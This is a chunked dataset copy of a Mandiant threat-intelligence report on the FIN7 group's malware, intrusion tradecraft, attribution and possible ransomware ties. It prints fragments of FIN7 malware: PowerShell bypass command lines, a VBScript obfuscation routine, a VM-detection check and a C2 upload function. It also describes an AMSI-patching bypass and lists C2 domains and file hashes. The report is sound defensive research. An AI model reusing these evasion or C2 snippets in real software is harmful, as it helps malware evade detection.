[
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x981d7bc9",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "text": "Bryce Abdo, Zander Work, Ioana Teaca, Brendan McKeague\nApr 04, 2022\n\n25 mins read\n\nThreat Research\nFinancial Threat Groups (FIN Groups)\nThreat Intelligence\nRecent public research asserts threat groups sharing overlaps with FIN7 transitioned to targeted ransomware operations involving REVIL, DARKSIDE, BLACKMATTER, and ALPHV ransomware. With the purported shift to ransomware operations, Mandiant is publishing our research on the evolution of FIN7 which we havent publicly written about since Mahalo FIN7, published in 2019.\nThis blog post draws on organic research from both historical and recent intrusions that Mandiant directly investigated, and describes the process of merging multiple UNC groups into FIN7. This process allowed us to merge eight previously suspected UNC groups into FIN7 in January 2022. We also highlight notable shifts in FIN7 activity over this time, including their use of novel malware, incorporation of new initial access vectors, and likely shift in monetization strategies.\nFIN7 continued to leverage PowerShell throughout their intrusions, including in a new backdoor called POWERPLANT, which FIN7 has continually developed over the last two years. We also identified new versions of the BIRDWATCH downloader being developed, which are tracked as CROWVIEW and FOWLGAZE.\nFIN7s initial access techniques have diversified to include software supply chain compromise and the use of stolen credentials, in addition to their traditional phishing techniques. We also observed FIN7 use POWERPLANT as their first stage malware instead of LOADOUT and/or GRIFFON in newer intrusions.\nData theft extortion or ransomware deployment following FIN7-attributed activity at multiple organizations, as well as technical overlaps, suggests that FIN7 actors have been associated with various ransomware operations over time.\nMandiant is also tracking multiple, notable campaigns as separate UNC groups that we suspect are FIN7, including a BadUSB campaign leading to DICELOADER, and multiple phishing campaigns leveraging cloud marketing platforms leading to BIRDWATCH.\nWe first disclosed threat reporting and publicized research on FIN7 in 2017. Since then, weve published multiple blog posts on FIN7 operations, with more extensive content available on Mandiant Advantage. In this blog post, we focus on examining the most recent FIN7 intrusion operations, as well as the attribution methodologies that we used."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x750e43a2",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "text": "Blog"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xe148cac2",
            "title": "Threat Attribution Over Time",
            "text": "Our attribution methodology requires multiple layers of overlaps within collected threat data to merge suspected FIN7 UNC groups into our core FIN7 cluster. Merge evidence is sourced from analysis of attacker infrastructure, intrusion tradecraft, modus operandi, and how specific code is employed by the groups we research. Rigorous documentation of technical evidence is critical for modern cybercrime attribution, when considering the fluid and opportunistic nature of cybercriminal operations, as well as individual operators narrow allegiances to criminal organizations. It is also common for us to observe multiple threat groups engaging in intrusion operations within close temporal proximity, sometimes even using the same access method within hours or minutes of each other. This is especially notable in the ransomware ecosystem, where Mandiant has observed individual members shift teams, and teams migrate between affiliate programs commonly adopting different TTPs across intrusions depending on who they are collaborating with or gaining access from at a given time.\nTo date, we suspect 17 additional UNCs of being affiliated with FIN7 with varying levels of confidence; however, those groups have not been formally merged into FIN7. Those groups activity spans as far back as 2015 and as recently as late 2021, across 36 separate intrusions. Eight previously suspected FIN7 UNC groups, active since 2020, have recently been merged into FIN7, confirming the resilience of actors associated with the threat group."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x9731622f",
            "title": "2020 Activity Brief: Heavy on the LOADOUT",
            "text": "FIN7 was active during the spring and summer of 2020, conducting phishing campaigns and attempting to distribute LOADOUT and GRIFFON. During that time, five UNC groups were created to track various campaigns, which eventually were merged into our new splinter group of FIN7, following merge analysis later in 2021 that expanded our understanding of FIN7. The impacts of related UNC merges for 2020 activity added usage of code families LOADOUT, TAKEOUT and a BIRDWATCH variant into FIN7.\nFigure 1: FIN7 Activity in 2020-2021\nLOADOUT is an obfuscated VBScript-based downloader which harvests extensive information from the infected system. The harvested information is then sent to a command-and-control (C2) server. C2 server responses for LOADOUT infections delivered GRIFFON, a JavaScript-based downloader which retrieves additional JavaScript modules using HTTP or DNS and executes them in memory.\nIn late summer of 2020, FIN7 capped off their busy year with the first observed usage of POWERPLANT. POWERPLANT, also referred to as KillACK, is a PowerShell-based backdoor with a breadth of capabilities, initially delivered following a successful GRIFFON infection in August 2020. Merges involving the usage of POWERPLANT into 2021 led us to assess that FIN7 is likely the only operator using POWERPLANT."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xc7fdf943",
            "title": "2021 Activity Brief: A Shift to POWERPLANT",
            "text": "We identified an uptick in FIN7-suspected UNC group activity during 2021 across five intrusions, beginning in April of 2021. The uptick led us to initiate a deep-dive research effort into FIN7. We also observed FIN7 shift their initial access techniques away from using LOADOUT, GRIFFON or CARBANAK in favor of direct deployment of POWERPLANT and BEACON. Specifically, FIN7 used POWERPLANT in all observed intrusions in 2021. FIN7 also relied on BEACON as a secondary mode of access alongside some POWERPLANT infections.\nThroughout 2021 we scrutinized a multitude of FIN7-linked UNC groups to our breadth of past FIN7 intelligence holdings, merging multiple threat clusters along the way. Our research revealed a fusion of older FIN7 intrusion tradecraft, and new FIN7 malware."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x33674b15",
            "title": "PowerShell Archaeology: FIN7 Habits Die Hard",
            "text": "There is no doubt about it, PowerShell is FIN7s love language. FIN7 has implemented malware into its offensive operations using many programming languages; however, during on-system interactions, FIN7s preference for boutique PowerShell-based loaders and unique PowerShell commands is dominant.\nOur deep dive into prior FIN7 intrusions dating as far back as 2019 bubbled up several long-standing patterns of unique PowerShell invocations still being used today. In the first example, command lines, such as in Figure 2 and Figure 3, had overall low-global prevalence outside of FIN7 and suspected FIN7 UNCs.\nThe unique aspect in the Figure 2 and Figure 3 commands is the distinct parameters -noni -nop -exe bypass -f, for launching scripts located in Admin shares and installing Windows services. Since 2019, we have observed FIN7 use command line parameters such as these while interacting with victim systems through backdoor malware such as CARBANAK. We have since seen a shift of some of these distinct PowerShell commands being initiated through POWERPLANT infections.\nSmaller patterns and consistencies across FIN7 intrusions from 2019 and beyond reveal more distinct PowerShell command lines using -ex bypass -f or -ex bypass -file as passed parameters. Although those patterns appear modest to hunt for, the combinations have extremely low global prevalence outside of FIN7-associated threat activity. For example, the first command line pattern has been seen over 2800 times, all of which were events attributed to FIN7. The second command line pattern has been seen nearly 250 separate times at 10 different victims as far back as 2019, all of which were FIN7 attributed commands.\nIn addition to FIN7s unique command lines during intrusion operations, we identified long-standing usage of other PowerShell code families, such as POWERTRASH. POWERTRASH is an in-memory dropper, or loader, written in PowerShell that executes an embedded payload. Observed payloads loaded by FIN7s POWERTRASH include CARBANAK, DICELOADER, SUPERSOFT, BEACON and PILLOWMINT. POWERTRASH is a uniquely obfuscated iteration of a shellcode invoker included in the PowerSploit framework available on GitHub.\nWith this improved understanding of FIN7 intrusion operations, we assembled our analytical efforts to begin merging multiple suspected UNCs into FIN7. As part of this initiative, we identified new FIN7 missions targeting our customers, including a Managed Defense Rapid Response engagement in 2021.",
            "table": "0\npowershell.exe -ex bypass -f pkit.ps1  powershell.exe -ex bypass -f cube.ps1\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xb4426dd9",
            "title": "Managing a Defense",
            "text": "FIN7 has targeted a broad spectrum of organizations in multiple industries, including Software, Consulting, Financial Services, Medical Equipment, Cloud Services, Media, Food and Beverage, Transportation, and Utilities. We identified over a dozen intrusions attributed to FIN7 since 2020 across our client base. The following use case profiles recent FIN7 tradecraft during a Mandiant Managed Defense engagement in 2021."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x58fab8d2",
            "title": "FIN7 From the Trenches",
            "text": "To obtain initial access during this intrusion, FIN7 used compromised Remote Desktop Protocol (RDP) credentials to login to a target server across two separate days, and initiated two similar Windows process chains (Figure 7).\nFIN7 used established RDP access to eventually install other modes of host control, first by executing PowerShell reconnaissance scripts, then by executing a TERMITE loader (Figure 8).\nTERMITE is a password-protected shellcode loader which we have observed at least seven distinct threat groups use to load BEACON, METASPLOIT, and BUGHATCH shellcodes. FIN7 used TERMITE to load and execute a shellcode stager for Cobalt Strike BEACON in this case.\nFollowing secondary access of BEACON, FIN7 began further enumeration using built-in Windows commands as well as POWERSPLOIT and Kerberoasting PowerShell modules.\nAfter the initial reconnaissance using RDP and BEACON, FIN7 executed an obfuscated loader for a victim-customized variant of the PowerShell-based backdoor POWERPLANT, providing tertiary access:\nFIN7 then attempted to steal credentials and further compromise the victims environment with limited success, as the client was able to respond and quickly remediate with the advantage of Managed Defense responders.\nA unique aspect of this specific intrusion perfectly highlighted the challenges of technical attribution for cybercriminal threats: Between the two days of FIN7 operations on the victim system, FIN12 was also active on the same victim for multiple hours using the same RDP account, but much different infrastructure and tradecraft, attempting to install BEACON using the WEIRDLOOP in-memory dropper before the intrusion was remediated.",
            "table": "0\npowershell.exe -ex bypass -f cube.ps1\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xb779d416",
            "title": "FIN7s Evasion",
            "text": "Among FIN7s historical trademarks were their creative obfuscation and fast development of evasive techniques. This is still the case, with FIN7 first stage droppers and downloaders being heavily obfuscated. LOADOUT in particular, due to its wide distribution in opportunistic campaigns, has been through several iterations meant to improve evasion.\nThe initial obfuscation mechanism was basic but effective at evading static detections: the malicious code was interspersed with random junk code (Figure 9). After a few months of successful campaigning, AV detection engines improved coverage of the downloader. To get around this, and to send a message, LOADOUT developer(s) broke up the beacon suspected to be used in detection signatures by simply inserting FUCKAV into the strings (Figure 8).\nIndeed, the developer(s) was correct to be suspicious that these strings were being used for detection. By pivoting on the beacon, we discovered a new, work-in-progress variant of LOADOUT submitted to VirusTotal (MD5: 485b2a920f3b5ae7cfad93a4120ec20d), detected by only one engine (Figure 10). Two hours later, a new version was submitted (MD5: 012e7b4d6b5cb8d46771852c66c71d6d), this time with the offending PowerShell command obscured through their custom obfuscation mechanism (Figure 11).\nFIN7 actors have historically tested their tools against public repositories to check static detection engine coverage. It is likely that in this case, they were testing the strength of their custom obfuscation.\nThis new and improved version of LOADOUT emerged five months later. It was refactored to add multiple layers of obfuscation, including interspersed Bible verses as filler text, and string obfuscation through a custom mechanism (Figure 12).",
            "table": "0\n\"Private Function GetShiftKey()  On Error Resume Next  Set Key = CreateObject(\"\"Scripting.Dictionary\"\")  l = Len(CryptoKey)  i1 = 0  With Key  For i = 1 To l  s = Mid(CryptoKey, i, 1)  n = (Asc(s) Mod 8) + 1  If Not .Exists(n) Then  .Add n, n  i1 = i1 + 1  End If  If i1 = 9 Then Exit For  Next  If i >= l And i1 < 9 Then  For i = 1 + 1 To 8  If Not .Exists(i) Then  .Add i, i  End If  Next  End If  For i = 1 To 8  GetShiftKey = GetShiftKey + .Items()(i)  Next  End With  End Function  Private Function TextShifter(txt)  Dim nKeys(), out()  Key = GetShiftKey  n = Len(Key)  If n = 0 Then Exit Function  l = Len(txt)  m = -Int(-l / n)  ReDim nKeys(n)  For i = 1 To n  s1 = Mid(Key, i, 1)  For j = 1 To n  s2 = Mid(Key, j, 1)  If s1 > s2 Or (s1 = s2 And j <= i) Then  nKeys(i) = nKeys(i) + 1  End If  Next  Next  ReDim out(n * m)  For i = 1 To Len(txt)  out(nKeys((i - 1) Mod n + 1) * m + (i - 1) \\ n - m + 1) = Mid(txt, i, 1)  Next  TextShifter = Join(out, \"\"\"\")  End Function\"\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xf124be94",
            "title": "POWERPLANT: FIN7s PowerShell Workhorse",
            "text": "FIN7 has leveraged multiple methods of initial and secondary access into victim networks including phishing, compromising third-party systems, Atera agent installers, GoToAssist, and RDP. In a recent case, FIN7 actors compromised a website that sells digital products and modified multiple download links to point to an Amazon S3 bucket hosting trojanized versions, containing an Atera agent installer. This remote management tool was later used to deploy POWERPLANT to the victim system. This was the first time Mandiant observed FIN7 leverage supply chain compromise. FIN7s time-tested CARBANAK and DICELOADER (also known as Lizar) malware continue to be in use; however, we have noticed FIN7 depend more on the POWERPLANT backdoor during recent intrusions.\nOur research into POWERPLANT has revealed that it is a vast backdoor framework with a breadth of capabilities, depending on which modules are delivered from the C2 server. POWERPLANT backdoors contain internal version identifiers within the code. We have identified samples ranging from version 0.012 through 0.028, with examples shown in Table 1.\nThe rate of increase in these internal version numbers over time suggests that FIN7 is actively developing POWERPLANT (Figure 13). In one engagement, we observed FIN7 deploy incremented versions of POWERPLANT with tweaked functionality to targets in the middle of intrusion operations. During that engagement, versions 0.023 and 0.025 were both used within a 10-minute timeframe. Each version we have identified implements overall similar functionality with some programmatic improvements and features added over time.\nFigure 13: POWERPLANT version numbers\nMandiant also recovered portions of server-side code components from POWERPLANT controllers. Some of these components contain clues that hint at the operational security mindfulness of the malwares developers. Two such examples are FIN7 being aware of researchers investigating their infrastructure, and employing capabilities to ban target host aspects such as usernames from the panel.\nDuring active C2 sessions, POWERPLANT servers will send multiple additional module types as tasks for target systems to execute. Two of these modules are EASYLOOK and BOATLAUNCH.",
            "table": "0\n\"/**  * \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f  */  init() {  this.config();  this.events();  },  /**  * \u041a\u043e\u043d\u0444\u0438\u0433\u0438  */  config() {  this.config = {  window: $(window),  document: $(document),  content: $('#content'),  lastUrl: null,  isPage: true,  isModal: false,  intervalId: null,  timer: null,  selectedBots: []  };  }\"\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xe5f683db",
            "title": "EASYLOOK Module",
            "text": "EASYLOOK is a reconnaissance utility that FIN7 has used since at least 2019. EASYLOOK captures a wide range of data from infected systems, including operating system version, registration key, system name, username, domain information, and hardware specifications.\nThe initial version of EASYLOOK was delivered by a GRIFFON C2 server and written in JScript (Figure 18). FIN7s updated variation of EASYLOOK was delivered by a POWERPLANT variant C2 server and written in PowerShell (Figure 17). Both versions implemented the exact same functionality across two code languages, including the typo bios_versoin.",
            "table": "0\n\"function is_vm () {  var biosRequest = wmi.ExecQuery('SELECT * FROM Win32_BIOS');  var biosItems = new Enumerator(biosRequest);  for (; !biosItems.atEnd(); biosItems.moveNext()) {  var bios_versoin = biosItems.item().SMBIOSBIOSVersion.toLowerCase();  var serial_number = biosItems.item().SerialNumber.toLowerCase();  if(serial_number.indexOf('parallels') >= 0 || serial_number.indexOf('vmware') >= 0) {  return true;  }  if(bios_versoin.indexOf('vmware') >= 0 || bios_versoin.indexOf('virtualbox') >= 0) {  return true;  }  }  return false;  }\"\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x3d26b809",
            "title": "BOATLAUNCH Module",
            "text": "BOATLAUNCH is a utility sent from FIN7 POWERPLANT controllers that is used as a helper module during intrusion operations. BOATLAUNCH is used to patch PowerShell processes on infected systems to bypass Windows AntiMalware Scan Interface (AMSI). The malware loops, looking for unpatched PowerShell processes, and for each unpatched process the malware locates and patches amsi.dll!AmsiScanBuffer with a 5-byte instruction sequence to always return S_OK.\nThe technique used to patch AMSI is a variation of publicly described common AMSI bypass techniques. Both 32bit and 64bit variants of BOATLAUNCH have been observed using the following export directory DLL names (Table 2).",
            "table": "0;1\nBOATLAUNCH Bitness;Export Directory Name\n32-bit;amsi32_kill.dll\n64-bit;amsi64_kill.dll\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x69856f23",
            "title": "The Curious Cases of BIRDWATCH",
            "text": "Our deep dive also revealed usage of BIRDWATCH and its similar variants used by FIN7 and suspected FIN7 groups such as UNC3381. BIRDWATCH is a .NET-based downloader which retrieves payloads over HTTP, writing them to disk and then executing them. BIRDWATCH uploads reconnaissance information from targeted systems as well, which includes running processes, software installed, network configuration, web browser information and active directory data.\nBIRDWATCH is often referred to collectively as JssLoader; however, multiple variations of BIRDWATCH exist which we track as separate code families. One variant of BIRDWATCH is CROWVIEW, which is also .NET-based, but has enough code differences from prototypical BIRDWATCH that we cluster it separately. Unlike BIRDWATCH, CROWVIEW can house an embedded payload, can self-delete, supports additional arguments and stores a slightly different configuration.\nFIN7 has implemented similar or exact functionality in different programming languages, observed in various code families several times over the past few years. Similar to EASYLOOK, which has both JScript and PowerShell variants, BIRDWATCH and CROWVIEW have separate versions implemented in C++. This data point of code reuse and overlaps aided our technical attribution throughout multiple UNC merges, when combined with additional infrastructure and tradecraft analysis.\nIn this first example, programmatic collection of the BIOS (Basic Input Output System) serial number is shown across POWERPLANT and CROWVIEW code families.\nSystem enumeration data formatting overlaps also exist between FOWLGAZE and EASYLOOK. Both code families implement near identical system surveys, with the shared usage of keys such as pc_domain, pc_dns_host_name, pc_model and no_ad.\nA final code reuse example is usage of \"theAnswer\", defined as variable within program functionality of POST requests to C2 controllers for both CROWVIEW and POWERPLANT, as shown in Figure 23 and Figure 24.\nMalware code usage is sometimes considered a primary data point for some public threat attribution. Code overlaps by themselves, without sufficient additional data points such as intrusion data and infrastructure, are not strong enough for us to fully assess that an UNC group should be merged. Throughout 2021 and well into 2022, we have identified and will continue to track multiple newly suspected FIN7 UNCs and their activity moving forward.",
            "table": "0\n\"Function Send-ToConsole([String] $theAnswer) {  if ([String]::IsNullOrEmpty($theAnswer)) { return }  $_rc = \"\"\"\"  try {  $_wc = New-Object System.Net.WebClient  $_wc.QueryString.Add(\"\"id\"\", $script:myID)  $_wc.Headers.Add(\"\"Content-type\"\", \"\"text/html\"\")  $_wc.Headers.Add(\"\"Accept\"\", \"\"text/html\"\")  $_rc = $_wc.UploadString($urlConsole, $theAnswer)\"\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x4af949fd",
            "title": "Additional Recent Activity from Suspected FIN7 UNCs",
            "text": "In October 2021, Mandiant observed a campaign where actors mailed victim organizations BadUSB malicious USB devices, primarily targeting U.S.-based organizations. We attribute this campaign to UNC3319, a group which we suspect to be associated with FIN7 with low confidence.\nThe USB hardware was programmed to download STONEBOAT, which ultimately installed the DICELOADER framework on the victim system. STONEBOAT is a previously unseen, .NET-based in-memory dropper which decrypts a shellcode payload embedded in it. The payload is then mapped into memory and executed. STONEBOAT was observed first loading an intermediary loader called DAVESHELL, which then executed the final DICELOADER payload. DAVESHELL is publicly available, open-source code for a launcher of embedded payloads. DAVESHELL is used by nearly 30 threat groups including FIN12; however, the implementation of DAVESHELL shellcode loading DICELOADER was unique to a small cluster of threat activity.\nAdditionally, weve identified multiple phishing campaigns distributing BIRDWATCH that have leveraged compromised accounts on various email delivery and marketing platforms, including Maropost, ActiveCampaign, and Mailjet. We attribute this activity to UNC3381, which is suspected to be FIN7 with low confidence. UNC3381 was first observed in September 2021, but weve identified similar activity leveraging Mailjet dating back to late 2019, suspected to be UNC3381 with high confidence.\nThroughout their campaigns, UNC3381 has used nearly identical Quickbooks-themed invoice lures and leveraged the branding of the compromised account that they were sent from, providing additional legitimacy for their phishes. These emails contained a malicious link that goes through the analytics domain associated with the platform they were sent from, before redirecting to a page typically hosted on a compromised domain.\nFigure 25: UNC3381 Quickbooks-themed phishing email\nUNC3381 has used multiple malware families in these campaigns, including WINGNIGHT and FLYHIGH, two different downloader families which weve only observed being used by UNC3381. WINGNIGHT is a WSF-based downloader that utilizes VBScript, and FLYHIGH is a downloader written in C using the Excel XLL SDK, but masquerades as using the Excel-DNA framework. In these campaigns, we observed both WINGNIGHT and FLYHIGH leading to BIRDWATCH, often leveraging additional compromised domains for both the download server and the BIRDWATCH C2 controller. Weve observed limited overlaps between UNC3381 and FIN7 infrastructure as well, including the use of the same DNS provider and AS."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x72813143",
            "title": "FIN7 and Ransomware",
            "text": "Mandiant published finished intelligence in 2020 which outlined evidence of FIN7s possible shift in monetization of intrusions from payment card data to extortion operations. Although FIN7s operations have shifted substantially when compared to their older activity, as of publishing this report, Mandiant has not attributed any direct deployment of ransomware to FIN7. However, the possibility that FIN7 actors are engaging in ransomware operations is also substantiated by evidence outside of our intrusion data holdings and includes code usage, actor infrastructure, and trusted third party sources.\nIn at least two incident response engagements in 2020, FIN7 intrusion operations were identified prior to ransomware encryption, including the use of MAZE and RYUK. Similarly in 2021, Mandiant attributed active FIN7 intrusion activity during an incident response engagement involving ALPHV ransomware. In all these cases, the ransomware deployment is currently attributed to separately tracked threat groups due to factors of the investigation and our visibility.\nIn addition to evidence produced from intrusion data, secondary artifacts suggest FIN7 played a role in at least some DARKSIDE operations. A low global prevalence code signing certificate used by FIN7 in 2021 to sign BEACON and BEAKDROP samples was also used to sign multiple unattributed DARKSIDE samples recovered in the wild (Table 3). The specific mentioned code signing certificate used by FIN7 contained the SSL subject common name of OASIS COURT LIMITED (Figure 26).",
            "table": "0;1\nFile MD5;Note\nab29b9e225a05bd17e919e1d0587289e;DNS BEACON\n1c3b19163a3b15b39ae00bbe131b499a;DARKSIDE\n230a681ebbcdba7ae2175f159394d044;DARKSIDE\nbf41fc54f96d0106d34f1c48827006e4;DARKSIDE\nc4da0137cbb99626fd44da707ae1bca8;DARKSIDE\n28e9581ab34297b6e5f817f93281ffac;FIN7 BEACON\n38786bc9de1f447d0187607eaae63f11;FIN7 BEACON\n6fba605c2a02fc62e6ff1fb8e932a935;FIN7 BEAKDROP\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x51c77434",
            "title": "Conclusion",
            "text": "Despite indictments of members of FIN7 in 2018 and a related sentencing in 2021 announced by the U.S. Department of Justice, at least some members of FIN7 have remained active and continue to evolve their criminal operations over time. Throughout their evolution, FIN7 has increased the speed of their operational tempo, the scope of their targeting, and even possibly their relationships with other ransomware operations in the cybercriminal underground."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x538d65d8",
            "title": "Acknowledgements",
            "text": "Thank you to Van Ta, Rufus Brown, Dan Perez, Barry Vengerik, Kimberly Goody and Andrew Thompson for a technical review of this content and FIN7 research involved behind-the-scenes. In addition, thank you to all Mandiant Incident Response and Managed Defense responders for harvesting the valuable intrusion data that enables our research."
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x82bf1273",
            "title": "Indicators of Compromise (IOCs)",
            "text": "",
            "table": "0;1\nIndicator;Notes\n0c6b41d25214f04abf9770a7bdfcee5d;BOATLAUNCH 32bit\n21f153810b82852074f0f0f19c0b3208;BOATLAUNCH 64bit\n02699f95f8568f52a00c6d0551be2de5;POWERPLANT\n0291df4f7303775225c4044c8f054360;POWERPLANT\n0fde02d159c4cd5bf721410ea9e72ee2;POWERPLANT\n2cbb015d4c579e464d157faa16994f86;POWERPLANT\n3803c82c1b2e28e3e6cca3ca73e6cce7;POWERPLANT\n5a6bbcc1e44d3a612222df5238f5e7a8;POWERPLANT\n833ae560a2347d5daf05d1f670a40c54;POWERPLANT\nb637d33dbb951e7ad7fa198cbc9f78bc;POWERPLANT\nbce9b919fa97e2429d14f255acfb18b4;POWERPLANT\nd1d8902b499b5938404f8cece2918d3d;POWERPLANT\nedb1f62230123abf88231fc1a7190b60;POWERPLANT\nfindoutcredit[.]com;POWERPLANT C2\nagaincome[.]com;POWERPLANT C2\nmodestoobgyn[.]com;POWERPLANT C2\nmyshortbio[.]com;POWERPLANT C2\nestetictrance[.]com;POWERPLANT C2\ninternethabit[.]com;POWERPLANT C2\nbestsecure2020[.]com;POWERPLANT C2\nchyprediction[.]com;POWERPLANT C2\nd405909fd2fd021372444b7b36a3b806;POWERTRASH Cryptor & CARBANAK Payload\n122cb55f1352b9a1aeafc83a85bfb165;CROWVIEW (BIRDWATCH/JssLoader Variant)\ndomenuscdm[.]com;CROWVIEW/LOADOUT C2\n936b142d1045802c810e86553b332d2d;LOADOUT\n23e1725769e99341bc9af48a0df64151;LOADOUT\n4d56a1ca28d9427c440ec41b4969caa2;LOADOUT\n50260f97ac2365cf0071e7c798b9edda;LOADOUT\nspontaneousance[.]com;LOADOUT C2\nfashionableeder[.]com;LOADOUT C2\nincongruousance[.]com;LOADOUT C2\nelectroncador[.]com;LOADOUT C2\n6fba605c2a02fc62e6ff1fb8e932a935;BEAKDROP\n49ac220edf6d48680f763465c4c2771e;BEACON\nastara20[.]com;BEACON C2\ncoincidencious[.]com;BEACON C2\n52f5fcaf4260cb70e8d8c6076dcd0157;Trojanized installer containing Atera Agent\n78c828b515e676cc0d021e229318aeb6;WINGNIGHT\n70bf088f2815a61ad2b1cc9d6e119a7f;WINGNIGHT\n4961aec62fac8beeafffa5bfc841fab8;FLYHIGH\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x29cec627",
            "title": "Mandiant Security Validation Actions",
            "text": "Organizations can validate their security controls against more than 25 actions with Mandiant Security Validation.",
            "table": "0;1\nVID;Name\nA150-527;Command and Control - FIN7, BATELEUR, Check-in\nA150-528;Command and Control - FIN7, GRIFFON, Check-in\nA151-165;Command and Control - FIN7, GRIFFON, DNS Query #1\nA151-166;Command and Control - FIN7, GRIFFON, DNS Query #2\nA104-585;Host CLI - FIN7, Local Javascript Execution via WMI and Mshta\nA150-546;Malicious File Transfer - FIN7, CARBANAK, Download, Variant #1\nA150-548;Malicious File Transfer - FIN7, CARBANAK, Download, Variant #3\nA150-710;Malicious File Transfer - FIN7, DICELOADER, Download, Variant #1\nA150-549;Malicious File Transfer - FIN7, DRIFTPIN, Download, Variant #1\nA150-550;Malicious File Transfer - FIN7, DRIFTPIN, Download, Variant #2\nA151-168;Malicious File Transfer - FIN7, GRIFFON, Download, JavaScript Variant\nA150-553;Malicious File Transfer - FIN7, GRIFFON, Download, Variant #1\nA150-554;Malicious File Transfer - FIN7, GRIFFON, Download, Variant #2\nA150-555;Malicious File Transfer - FIN7, GRIFFON, Download, Variant #3\nA150-572;Malicious File Transfer - FIN7, SUPERSOFT, Download, Variant #1\nA150-729;Malicious File Transfer - FIN7, TAKEOUT, Download, Variant #1\nA150-730;Malicious File Transfer - FIN7, TAKEOUT, Download, Variant #2\nA150-731;Malicious File Transfer - FIN7, TAKEOUT, Download, Variant #3\nA150-585;Phishing Email - Malicious Attachment, FIN7, BATELEUR DOC Lure\nA150-586;Phishing Email - Malicious Attachment, FIN7, GRIFFON DOCM Lure\nA151-167;Phishing Email - Malicious Attachment, FIN7, GRIFFON, Windows 11 Themed Lure\nA150-587;Phishing Email - Malicious Attachment, FIN7, Tracking Pixel\nA150-590;Protected Theater - 